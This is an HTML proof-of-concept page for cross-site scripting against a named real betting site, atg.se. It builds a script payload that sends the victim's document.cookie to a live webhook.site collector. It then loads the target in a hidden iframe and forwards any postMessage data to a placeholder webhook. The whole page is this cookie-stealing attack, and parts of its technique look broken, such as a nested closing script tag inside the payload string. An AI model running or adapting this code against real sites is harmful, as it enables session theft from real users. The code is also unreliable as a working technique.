<!DOCTYPE html>
<html>
  <head>
    <title>ATG XSS PoC</title>
  </head>
  <body>
    <h1>Loadingâ€¦</h1>

    <script>
      // Payload to inject via window.name
      const payload = `<script>fetch('https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6?c=' + document.cookie)</script>`;

      // Set window.name for the iframe (used by some React apps internally)
      window.name = payload;

      // Create sandboxed iframe to load ATG
      const iframe = document.createElement("iframe");
      iframe.sandbox = "allow-scripts allow-same-origin";
      iframe.src = "https://www.atg.se/";
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      // Optional: Listen for any postMessage response from iframe
      window.addEventListener("message", function (e) {
        fetch("https://your-webhook.com/log?msg=" + encodeURIComponent(e.data));
      });
    </script>
  </body>
</html>
